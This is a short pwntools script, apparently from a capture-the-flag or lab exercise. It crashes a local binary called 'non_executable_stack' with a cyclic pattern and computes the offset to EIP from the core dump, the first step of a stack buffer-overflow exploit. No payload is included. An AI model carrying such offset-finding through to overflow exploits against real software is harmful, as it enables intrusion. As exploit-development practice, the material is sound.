#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

elf = ELF('./non_executable_stack')
p = process('./non_executable_stack')

# Generar patrón cíclico
pattern = cyclic(100)
print(f"[*] Sending pattern: {pattern}")

p.recvuntil(b'Enter the secret password:\n')
p.sendline(pattern)
p.wait()

# Obtener core dump
core = Coredump('./core')
eip = core.eip
print(f"[*] EIP crashed at: {hex(eip)}")

# Encontrar offset
offset = cyclic_find(eip)
print(f"[*] Offset to EIP: {offset}")
